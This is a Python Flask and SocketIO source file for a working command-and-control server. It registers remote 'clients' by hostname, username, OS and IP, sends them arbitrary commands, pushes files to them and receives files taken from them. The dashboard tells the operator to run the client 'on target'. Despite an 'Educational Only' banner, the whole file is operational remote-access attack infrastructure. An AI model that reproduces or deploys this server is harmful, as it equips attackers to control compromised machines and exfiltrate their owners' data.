#!/usr/bin/env python3
"""
C2 SERVER - Clean & Simple
Features: Multiple clients, Command execution, File upload/download
"""

from flask import Flask, request, jsonify, send_file
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import os
import json
import base64
import hashlib
import time
from datetime import datetime
import secrets
import threading
from collections import defaultdict

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB

# Storage
os.makedirs('uploads', exist_ok=True)
os.makedirs('downloads', exist_ok=True)

# SocketIO with threading
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# In-memory storage
clients = {}  # {client_id: {info}}
client_sockets = {}  # {client_id: socket_id}
command_results = {}  # {command_id: result}
pending_commands = defaultdict(list)  # {client_id: [commands]}
authenticated_sessions = {}  # {session_id: expiry}

# Dashboard password
DASHBOARD_PASSWORD = "C2RICARDO"

print("""
╔══════════════════════════════════════════════════════════════╗
║                      C2 SERVER v1.0                          ║
║            Simple • Fast • Educational Only                  ║
╚══════════════════════════════════════════════════════════════╝
""")

# ============= WEB ROUTES =============

@app.route('/')
def index():
    """Protected dashboard"""
    # Check if authenticated
    session_id = request.cookies.get('c2_session')
    
    if session_id and session_id in authenticated_sessions:
        if authenticated_sessions[session_id] > time.time():
            # Show dashboard
            return dashboard_html()
        else:
            # Session expired
            del authenticated_sessions[session_id]
    
    # Show login
    return login_html()

@app.route('/auth', methods=['POST'])
def authenticate():
    """Authenticate user"""
    password = request.form.get('password', '')
    
    if password == DASHBOARD_PASSWORD:
        # Create session
        session_id = secrets.token_hex(32)
        authenticated_sessions[session_id] = time.time() + 3600  # 1 hour
        
        # Redirect to dashboard
        response = app.make_response(dashboard_html())
        response.set_cookie('c2_session', session_id, max_age=3600, httponly=True)
        return response
    else:
        return """
        <html>
        <head>
            <title>Access Denied</title>
            <style>
                body {
                    font-family: 'Consolas', monospace;
                    background: #000;
                    color: #ff0000;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                    margin: 0;
                }
                .error { text-align: center; }
                h1 { font-size: 3em; text-shadow: 0 0 10px #ff0000; }
                a { color: #ff0000; text-decoration: none; }
            </style>
        </head>
        <body>
            <div class="error">
                <h1>⛔ ACCESS DENIED</h1>
                <p>Invalid password</p>
                <p><a href="/">← Try again</a></p>
            </div>
        </body>
        </html>
        """

def login_html():
    """Login page"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Server - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Consolas', monospace;
                background: #000;
                color: #00ff00;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
            }
            .login-box {
                background: rgba(0, 255, 0, 0.05);
                border: 2px solid #00ff00;
                padding: 40px;
                border-radius: 10px;
                text-align: center;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            }
            h1 {
                font-size: 2em;
                margin-bottom: 10px;
                text-shadow: 0 0 10px #00ff00;
            }
            .subtitle {
                color: #00cc00;
                margin-bottom: 30px;
                font-size: 0.9em;
            }
            input[type="password"] {
                width: 300px;
                padding: 15px;
                font-family: 'Consolas', monospace;
                font-size: 1.1em;
                background: #000;
                border: 2px solid #00ff00;
                color: #00ff00;
                border-radius: 5px;
                margin-bottom: 20px;
                text-align: center;
            }
            input[type="password"]:focus {
                outline: none;
                box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            }
            button {
                width: 300px;
                padding: 15px;
                font-family: 'Consolas', monospace;
                font-size: 1.1em;
                background: #00ff00;
                color: #000;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-weight: bold;
            }
            button:hover {
                background: #00cc00;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            }
            .warning {
                margin-top: 20px;
                font-size: 0.8em;
                color: #ff6b6b;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔒 C2 SERVER</h1>
            <p class="subtitle">Authorized Access Only</p>
            <form method="POST" action="/auth">
                <input type="password" name="password" placeholder="Enter Password" required autofocus>
                <br>
                <button type="submit">AUTHENTICATE</button>
            </form>
            <p class="warning">⚠️ Unauthorized access is prohibited</p>
        </div>
    </body>
    </html>
    """

def dashboard_html():
    """Simple protected dashboard"""
    online = sum(1 for c in clients.values() if c.get('online', False))
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Server Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{
                font-family: 'Consolas', monospace;
                background: #000;
                color: #00ff00;
                padding: 20px;
            }}
            .container {{ max-width: 1200px; margin: 0 auto; }}
            .header {{
                text-align: center;
                margin-bottom: 30px;
                padding: 20px;
                border: 2px solid #00ff00;
                border-radius: 10px;
                background: rgba(0, 255, 0, 0.05);
            }}
            h1 {{ 
                font-size: 2em; 
                margin-bottom: 10px;
                text-shadow: 0 0 10px #00ff00;
            }}
            .status {{ color: #00cc00; font-size: 0.9em; }}
            .stats {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }}
            .stat-box {{
                background: rgba(0, 255, 0, 0.05);
                border: 2px solid #00ff00;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
            }}
            .stat-number {{ 
                font-size: 3em; 
                font-weight: bold;
                text-shadow: 0 0 10px #00ff00;
            }}
            .stat-label {{ margin-top: 10px; color: #00cc00; }}
            .info {{
                background: rgba(0, 255, 0, 0.05);
                border: 2px solid #00ff00;
                padding: 20px;
                border-radius: 10px;
                margin-top: 20px;
            }}
            .info h3 {{ 
                margin-bottom: 15px;
                font-size: 1.2em;
            }}
            .info p {{ 
                padding: 8px;
                margin: 5px 0;
                background: rgba(0, 255, 0, 0.1);
                border-radius: 5px;
            }}
            code {{ 
                color: #00ff00;
                background: rgba(0, 0, 0, 0.5);
                padding: 2px 6px;
                border-radius: 3px;
            }}
            .pulse {{ animation: pulse 2s infinite; }}
            @keyframes pulse {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.5; }} }}
            .logout {{
                text-align: center;
                margin-top: 30px;
            }}
            .logout a {{
                color: #ff6b6b;
                text-decoration: none;
                padding: 10px 20px;
                border: 2px solid #ff6b6b;
                border-radius: 5px;
                display: inline-block;
            }}
            .logout a:hover {{
                background: #ff6b6b;
                color: #000;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🛸 C2 SERVER <span class="pulse">●</span></h1>
                <p class="status">OPERATIONAL • SECURE • PRIVATE</p>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number" id="total">{len(clients)}</div>
                    <div class="stat-label">Total Clients</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="online">{online}</div>
                    <div class="stat-label">Online Now</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="commands">{len(command_results)}</div>
                    <div class="stat-label">Commands Executed</div>
                </div>
            </div>
            
            <div class="info">
                <h3>📋 STATUS</h3>
                <p>✓ Server is running and accepting connections</p>
                <p>✓ WebSocket connections enabled</p>
                <p>✓ File transfer system active</p>
                <p>✓ Command queue processing</p>
            </div>
            
            <div class="info">
                <h3>🎮 USAGE</h3>
                <p>Run console: <code>python console.py</code></p>
                <p>Run client on target: <code>python client.py &lt;server_url&gt;</code></p>
                <p>Use console commands to control clients</p>
            </div>
            
            <div class="logout">
                <a href="/" onclick="document.cookie='c2_session=; Max-Age=0'; return true;">🚪 Logout</a>
            </div>
        </div>
        
        <script>
            async function updateStats() {{
                try {{
                    const res = await fetch('/api/stats');
                    const data = await res.json();
                    document.getElementById('total').textContent = data.total || 0;
                    document.getElementById('online').textContent = data.online || 0;
                    document.getElementById('commands').textContent = data.commands || 0;
                }} catch(e) {{}}
            }}
            setInterval(updateStats, 5000);
        </script>
    </body>
    </html>
    """

@app.route('/api/stats')
def get_stats():
    """Get server statistics"""
    online = sum(1 for c in clients.values() if c.get('online', False))
    return jsonify({
        'total': len(clients),
        'online': online,
        'commands': len(command_results),
        'timestamp': time.time()
    })

@app.route('/api/clients')
def api_clients():
    """Get all clients"""
    client_list = []
    for client_id, client in clients.items():
        client_list.append({
            'id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'platform': client.get('platform', 'Unknown'),
            'ip': client.get('ip', 'Unknown'),
            'online': client.get('online', False),
            'last_seen': client.get('last_seen', 0)
        })
    return jsonify(client_list)

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    # Generate command ID
    cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
    
    # Create command object
    cmd_obj = {
        'id': cmd_id,
        'command': command,
        'timestamp': time.time(),
        'status': 'pending'
    }
    
    # Send to client if online
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'command_id': cmd_id})
    else:
        # Queue for later
        pending_commands[client_id].append(cmd_obj)
        return jsonify({'status': 'queued', 'command_id': cmd_id})

@app.route('/api/result/<cmd_id>')
def get_result(cmd_id):
    """Get command result"""
    if cmd_id in command_results:
        return jsonify(command_results[cmd_id])
    else:
        return jsonify({'status': 'pending', 'output': None})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Upload file to send to client"""
    client_id = request.form.get('client_id')
    destination = request.form.get('destination', '')
    
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    # Save file
    file_id = f"upload_{int(time.time())}_{secrets.token_hex(4)}"
    file_path = os.path.join('uploads', file_id)
    file.save(file_path)
    
    # Read and encode file
    with open(file_path, 'rb') as f:
        file_data = base64.b64encode(f.read()).decode('utf-8')
    
    # Create upload command
    cmd_obj = {
        'id': file_id,
        'type': 'upload',
        'filename': file.filename,
        'destination': destination,
        'filedata': file_data,
        'size': os.path.getsize(file_path)
    }
    
    # Send to client
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'file_id': file_id})
    else:
        pending_commands[client_id].append(cmd_obj)
        return jsonify({'status': 'queued', 'file_id': file_id})

@app.route('/api/download/<file_id>')
def download_file(file_id):
    """Download file from server"""
    file_path = os.path.join('downloads', file_id)
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=True)
    else:
        return jsonify({'error': 'File not found'}), 404

# ============= WEBSOCKET EVENTS =============

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    print(f"[+] New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnect"""
    # Find and mark client as offline
    for client_id, socket_id in list(client_sockets.items()):
        if socket_id == request.sid:
            if client_id in clients:
                clients[client_id]['online'] = False
                clients[client_id]['last_seen'] = time.time()
            del client_sockets[client_id]
            print(f"[-] Client disconnected: {client_id}")
            # Notify consoles
            socketio.emit('client_offline', {'client_id': client_id}, namespace='/')
            break

@socketio.on('register')
def handle_register(data):
    """Client registers with server"""
    client_id = data.get('id')
    
    if not client_id:
        # Generate ID based on system info
        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}"
        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
    
    # Store client info
    clients[client_id] = {
        'id': client_id,
        'hostname': data.get('hostname', 'Unknown'),
        'username': data.get('username', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'ip': request.remote_addr,
        'online': True,
        'first_seen': clients.get(client_id, {}).get('first_seen', time.time()),
        'last_seen': time.time()
    }
    
    # Map socket to client
    client_sockets[client_id] = request.sid
    join_room(client_id)
    
    print(f"[+] Client registered: {client_id} - {data.get('hostname')} ({data.get('platform')})")
    
    # Send welcome
    emit('welcome', {
        'client_id': client_id,
        'message': 'Connected to C2 Server',
        'timestamp': time.time()
    })
    
    # Notify consoles
    socketio.emit('client_online', {
        'client_id': client_id,
        'hostname': data.get('hostname'),
        'platform': data.get('platform')
    }, namespace='/')
    
    # Send any pending commands
    if client_id in pending_commands and pending_commands[client_id]:
        for cmd in pending_commands[client_id]:
            emit('command', cmd)
        pending_commands[client_id].clear()

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle client heartbeat"""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('result')
def handle_result(data):
    """Handle command result from client"""
    cmd_id = data.get('command_id')
    client_id = data.get('client_id')
    
    print(f"[*] Result received: {cmd_id} from {client_id}")
    print(f"    Output length: {len(data.get('output', ''))} chars")
    
    # Store result
    command_results[cmd_id] = {
        'command_id': cmd_id,
        'client_id': client_id,
        'command': data.get('command', ''),
        'output': data.get('output', ''),
        'success': data.get('success', True),
        'status': data.get('status', 'completed'),
        'timestamp': time.time()
    }
    
    # Notify all consoles immediately (no broadcast param, namespace='/' means all)
    socketio.emit('command_result', command_results[cmd_id], namespace='/')
    
    # Also notify specific client room
    socketio.emit('result_ready', command_results[cmd_id], room=client_id, namespace='/')

@socketio.on('file_download')
def handle_file_download(data):
    """Handle file download from client"""
    file_id = data.get('file_id')
    filename = data.get('filename', 'downloaded_file')
    filedata = data.get('filedata')
    
    if filedata:
        # Decode and save file
        file_bytes = base64.b64decode(filedata)
        file_path = os.path.join('downloads', file_id)
        
        with open(file_path, 'wb') as f:
            f.write(file_bytes)
        
        print(f"[+] File received: {filename} ({len(file_bytes)} bytes)")
        
        # Notify consoles
        socketio.emit('file_ready', {
            'file_id': file_id,
            'filename': filename,
            'size': len(file_bytes)
        }, namespace='/')

@socketio.on('console_connect')
def handle_console_connect(data):
    """Console connects for updates"""
    print(f"[+] Console connected: {request.sid}")
    emit('console_ready', {'message': 'Connected to C2 server'})

# ============= MAIN =============

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print(f"[*] Starting C2 Server on port {port}")
    print(f"[*] Dashboard: http://0.0.0.0:{port}")
    print(f"[*] WebSocket: ws://0.0.0.0:{port}/socket.io")
    print()
    
    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
